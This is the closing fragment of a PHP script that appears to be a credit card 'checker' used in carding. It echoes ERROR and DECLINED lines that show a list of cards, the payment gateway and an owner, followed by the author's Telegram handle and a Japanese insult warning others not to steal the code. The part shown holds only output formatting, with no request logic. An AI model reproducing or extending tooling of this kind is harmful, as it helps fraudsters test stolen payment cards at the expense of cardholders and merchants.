 echo '<span class="declined">#ERROR: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: API Down. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
} else {
 echo '<span class="declined">#DECLINED: </span> <span class="crds"> '.$lista.' </span> <span class="msg"> { msg: Unknown Reason. } </span> <span class="gatew"> '.$gateways.'</span> <span class="gatew"> '.$owner.'</span><br>';
}

# TELEGRAM: @isnotdev

// 盗まないでよクソ野郎！

?>